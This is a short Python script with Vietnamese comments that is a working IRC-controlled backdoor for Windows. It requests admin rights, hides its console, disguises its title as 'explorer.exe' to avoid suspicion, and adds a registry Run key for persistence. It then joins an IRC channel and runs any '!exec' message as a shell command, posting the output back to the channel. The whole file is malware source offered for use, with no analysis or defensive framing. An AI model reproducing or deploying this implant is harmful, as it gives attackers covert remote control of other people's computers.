import socket
import threading
import time
import subprocess
import winreg
import ctypes
import win32console, win32gui
import sys

# --- Kiểm tra và tự nâng quyền Admin ---
if not ctypes.windll.shell32.IsUserAnAdmin():
    # Nếu không phải admin, tự yêu cầu quyền admin và thoát tiến trình hiện tại
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

# --- Ẩn cửa sổ console ---
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

# --- Đổi tiêu đề để tránh nghi ngờ ---
ctypes.windll.kernel32.SetConsoleTitleW("explorer.exe")

# --- Thông tin IRC ---
SERVER = "irc.libera.chat"  # Một server IRC phổ biến và còn hoạt động
PORT = 6667
NICK = "CppBot"
USER = "USER CppBot 8 * :I'm a C++ IRC bot"
CHANNEL = "#my_channel"

# --- Thiết lập persistence trong Registry để bot tự chạy sau khi khởi động Windows ---
def setup_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "CppBot", 0, winreg.REG_SZ, r"C:\Users\YourName\AppData\Roaming\cppbot.exe")
        winreg.CloseKey(key)
    except Exception:
        pass  # Không hiện thông báo lỗi để tránh gây chú ý

# --- Gửi lệnh IRC ---
def send_line(sock, line):
    sock.send((line + "\r\n").encode())

# --- Xử lý lệnh từ IRC (!exec <cmd>) ---
def handle_command(sock, nickname, message):
    if message.startswith("!exec "):
        command = message[6:]
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            send_line(sock, f"PRIVMSG {CHANNEL} :{result.decode(errors='ignore')[:300]}")
        except Exception as e:
            send_line(sock, f"PRIVMSG {CHANNEL} :Error: {e}")

# --- Gửi PING định kỳ để giữ kết nối ---
def ping_sender(sock):
    while True:
        send_line(sock, f"PING :{SERVER}")
        time.sleep(15)

# --- Main IRC client ---
def main():
    sock = socket.socket()
    sock.connect((SERVER, PORT))

    send_line(sock, f"NICK {NICK}")
    send_line(sock, USER)
    send_line(sock, f"JOIN {CHANNEL}")

    setup_persistence()

    threading.Thread(target=ping_sender, args=(sock,), daemon=True).start()

    while True:
        try:
            data = sock.recv(512).decode(errors="ignore")
            if "PING :" in data:
                pong_msg = "PONG :" + data.split(":")[1]
                send_line(sock, pong_msg)
            if "PRIVMSG" in data:
                nickname = data.split("!")[0][1:]
                message = data.split(":", 2)[2]
                handle_command(sock, nickname, message)
        except Exception:
            break

    sock.close()

if __name__ == "__main__":
    main()
